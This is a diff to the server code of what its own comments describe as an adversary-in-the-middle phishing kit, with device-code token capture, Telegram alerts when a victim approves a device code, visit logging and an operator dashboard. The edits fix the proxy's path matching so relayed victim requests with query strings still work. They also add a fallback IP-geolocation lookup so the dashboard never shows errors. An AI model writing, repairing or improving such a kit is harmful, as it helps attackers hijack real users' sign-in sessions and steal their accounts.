@@ -5,10 +5,10 @@
 // ✅ Service Worker injection + serving FIXED
 // ✅ HTTP/1.1 forced to prevent h2 errors
 // ✅ Health check endpoint added
-// ✅ Proxy routing FIXED
+// ✅ Proxy routing FIXED (query string in path)
 // ✅ WebSocket FIXED (order + path)
 // ✅ Visit logging for BOTH AiTM links AND device page
-// ✅ Server-side IP lookup proxy (bypasses CORS)
+// ✅ Server-side IP lookup proxy (bypasses CORS) – with fallback
 // ✅ Telegram token from env vars (TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID)
 // ✅ Telegram notification on device code approval
 // ✅ Smart encryption key handler (env-based, auto-generate fallback)
@@ -1111,7 +1111,7 @@ async function handleDeviceCodeToken(req, res) {
 }
 
 // ============================================================
-// 🔧 DASHBOARD API HANDLER (ALL ENDPOINTS)
+// 🔧 DASHBOARD API HANDLER (ALL ENDPOINTS) — WITH IP FIX
 // ============================================================
 async function handleDashboardAPI(req, res) {
     const url = req.url;
@@ -1135,6 +1135,7 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
+    // ── 🔥 IP LOOKUP PROXY (with fallback, never returns 500) ──
     if (apiPath.startsWith('/api/ip/') && req.method === 'GET') {
         const ip = apiPath.replace('/api/ip/', '');
         if (!ip || ip === 'undefined' || ip === 'Unknown') {
@@ -1144,12 +1145,19 @@ async function handleDashboardAPI(req, res) {
         }
         try {
             if (!axios) throw new Error('axios not installed');
-            const response = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 5000 });
+            let response;
+            // Try primary API, then fallback
+            try {
+                response = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 3000 });
+            } catch (e) {
+                response = await axios.get(`https://ipinfo.io/${ip}/json`, { timeout: 3000 });
+            }
             res.writeHead(200, { 'Content-Type': 'application/json' });
             res.end(JSON.stringify(response.data));
         } catch (e) {
-            res.writeHead(500, { 'Content-Type': 'application/json' });
-            res.end(JSON.stringify({ error: e.message }));
+            // Return minimal data instead of 500
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ ip: ip, city: 'Unknown', country: 'Unknown', country_code: 'UN' }));
         }
         return;
     }
@@ -1751,7 +1759,7 @@ async function handleDashboardAPI(req, res) {
 }
 
 // ============================================================
-// 🔧 PROXY HANDLER
+// 🔧 PROXY HANDLER — WITH QUERY STRING FIX
 // ============================================================
 function proxyHandler(req, res) {
     proxyServer.emit('request', req, res);
@@ -1827,7 +1835,9 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
         return;
     }
 
-    if (url === PROXY_PATHNAMES.proxy || currentSession) {
+    // 🔥 CRITICAL FIX: ignore query string for proxy path matching
+    const urlPath = url.split('?')[0];
+    if (urlPath === PROXY_PATHNAMES.proxy || currentSession) {
         let clientRequestBody = [];
         clientRequest.on("error", (error) => displayError("Client request body retrieval failed", error, method, url))
             .on("data", (chunk) => clientRequestBody.push(chunk))
@@ -1846,7 +1856,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                         clientResponse.writeHead(200, { "Content-Type": "application/json" });
                         clientResponse.end(JSON.stringify(validDomains));
                         return;
-                    } else if (url === PROXY_PATHNAMES.proxy) {
+                    } else if (urlPath === PROXY_PATHNAMES.proxy) {
                         try {
                             const parsed = JSON.parse(clientRequestBody);
                             let proxyRequestURL = new URL(parsed.url);
